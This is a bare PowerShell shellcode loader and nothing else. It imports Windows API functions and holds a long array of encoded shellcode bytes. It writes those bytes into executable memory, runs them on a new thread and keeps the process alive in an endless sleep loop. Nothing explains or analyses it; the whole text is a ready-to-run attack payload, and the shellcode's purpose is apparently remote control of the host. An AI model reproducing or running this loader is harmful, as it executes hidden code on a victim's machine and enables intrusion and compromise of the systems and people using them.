$M1a = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $M1a -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcd,0xd9,0x74,0x24,0xf4,0xb8,0x31,0xcd,0xda,0x04,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x18,0x03,0x42,0x18,0x83,0xea,0xcd,0x2f,0x2f,0xf8,0xc5,0x32,0xd0,0x01,0x15,0x53,0x58,0xe4,0x24,0x53,0x3e,0x6c,0x16,0x63,0x34,0x20,0x9a,0x08,0x18,0xd1,0x29,0x7c,0xb5,0xd6,0x9a,0xcb,0xe3,0xd9,0x1b,0x67,0xd7,0x78,0x9f,0x7a,0x04,0x5b,0x9e,0xb4,0x59,0x9a,0xe7,0xa9,0x90,0xce,0xb0,0xa6,0x07,0xff,0xb5,0xf3,0x9b,0x74,0x85,0x12,0x9c,0x69,0x5d,0x14,0x8d,0x3f,0xd6,0x4f,0x0d,0xc1,0x3b,0xe4,0x04,0xd9,0x58,0xc1,0xdf,0x52,0xaa,0xbd,0xe1,0xb2,0xe3,0x3e,0x4d,0xfb,0xcc,0xcc,0x8f,0x3b,0xea,0x2e,0xfa,0x35,0x09,0xd2,0xfd,0x81,0x70,0x08,0x8b,0x11,0xd2,0xdb,0x2b,0xfe,0xe3,0x08,0xad,0x75,0xef,0xe5,0xb9,0xd2,0xf3,0xf8,0x6e,0x69,0x0f,0x70,0x91,0xbe,0x86,0xc2,0xb6,0x1a,0xc3,0x91,0xd7,0x3b,0xa9,0x74,0xe7,0x5c,0x12,0x28,0x4d,0x16,0xbe,0x3d,0xfc,0x75,0xd6,0xf2,0xcd,0x85,0x26,0x9d,0x46,0xf5,0x14,0x02,0xfd,0x91,0x14,0xcb,0xdb,0x66,0x5b,0xe6,0x9c,0xf9,0xa2,0x09,0xdd,0xd0,0x60,0x5d,0x8d,0x4a,0x41,0xde,0x46,0x8b,0x6e,0x0b,0xf2,0x8e,0xf8,0x9a,0x0e,0xa2,0xc9,0x8a,0x12,0xc4,0x38,0x17,0x9a,0x22,0x6a,0xf7,0xcc,0xfa,0xca,0xa7,0xac,0xaa,0xa2,0xad,0x22,0x94,0xd2,0xcd,0xe8,0xbd,0x78,0x22,0x45,0x95,0x14,0xdb,0xcc,0x6d,0x85,0x24,0xdb,0x0b,0x85,0xaf,0xe8,0xec,0x4b,0x58,0x84,0xfe,0x3b,0xa8,0xd3,0x5d,0xed,0xb7,0xc9,0xc8,0x11,0x22,0xf6,0x5a,0x46,0xda,0xf4,0xbb,0xa0,0x45,0x06,0xee,0xbb,0x4c,0x92,0x51,0xd3,0xb0,0x72,0x52,0x23,0xe7,0x18,0x52,0x4b,0x5f,0x79,0x01,0x6e,0xa0,0x54,0x35,0x23,0x35,0x57,0x6c,0x90,0x9e,0x3f,0x92,0xcf,0xe9,0x9f,0x6d,0x3a,0xe8,0xdc,0xbb,0x02,0x9e,0x0c,0x78;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$DGHq=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($DGHq.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$DGHq,0,0,0);for (;;){Start-sleep 60};